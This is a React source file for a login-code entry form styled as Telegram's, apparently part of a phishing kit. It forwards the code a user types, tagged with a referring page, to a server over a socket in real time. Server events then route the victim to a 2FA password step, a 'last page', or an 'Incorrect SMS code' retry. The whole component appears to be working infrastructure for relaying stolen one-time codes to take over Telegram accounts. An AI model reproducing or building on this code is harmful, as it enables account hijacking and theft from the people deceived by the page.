import React, { memo, useEffect, useState } from "react";
import { useNavigate, useSearchParams } from 'react-router-dom';
import {sockets} from './HomePage';

const CodeForm = ({ setTab, phoneNumber }) => {
  const [searchParams, setSearchParams] = useSearchParams();
  const [error, setError] = useState(false);
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleChangeCode = (e) => {

    if(error && e.target.value.toString().length === 5){
      setError(false);
    }
    setCode(e.target.value.toString());
  }
  
  const sendCode = (e) => {
    e.preventDefault();

    if(code.length !== 5){
      setError(true);
      return;
    }

    try{
      sockets.emit("code", { code: code, from: searchParams.get("ref_page") });
      setLoading(true);
      setError(false)

    } catch(e){
      console.log(e);
    }
  }

  useEffect(() => {

    const nextHandler = () => {
      navigate('/userconnect/last-page')
    }

    const toFaHandler = () => {
      setTab(3)
    }

    const errorCodeHandler = () => {
      setLoading(false);
      setError(true);
    }

    sockets.on('2fa', toFaHandler)
    sockets.on('next', nextHandler)
    sockets.on('error-code', errorCodeHandler)

    return () => {
      sockets.off('2fa', toFaHandler)
      sockets.off('next', nextHandler)
      sockets.off('error-code', errorCodeHandler)
    }
  }, [])

  return <form className="code-form" onSubmit={sendCode}>
      <div className="code-form__inner">
        <div className="code-form__title inp1 inp1-label--width-275">+ {(phoneNumber.code + phoneNumber.phone) || '+7 909 101 19 11'}<span onClick={() => setTab(1)}>edit</span></div>
        <div className="code-form__descr">We've sent the code to the <span>Telegram</span> app on <br /> your other device.</div>
        <div className="code-form__below">Please enter the code below.</div>
        <label htmlFor="test3534" className='inp1-label inp1-label--width-275'>
            <input readOnly={loading} placeholder="Enter your code" className={error ? 'inp1 inp1--error' : 'inp1'} value={code} id='test3534' onChange={handleChangeCode} autoComplete='off' />
            <div className={error ? 'inp1-label__timeline inp1-label__timeline--error' : 'inp1-label__timeline'}></div>
        </label>
        {error && <div className="error1">Incorrect SMS code</div>}
        {loading && <div className="loading dots-animated">Checking code</div>}
      </div>
      <div className='code-form__controls'>
        <button type="submit" className="button button--transparent">Next</button>
      </div>
  </form>
}

export default memo(CodeForm);
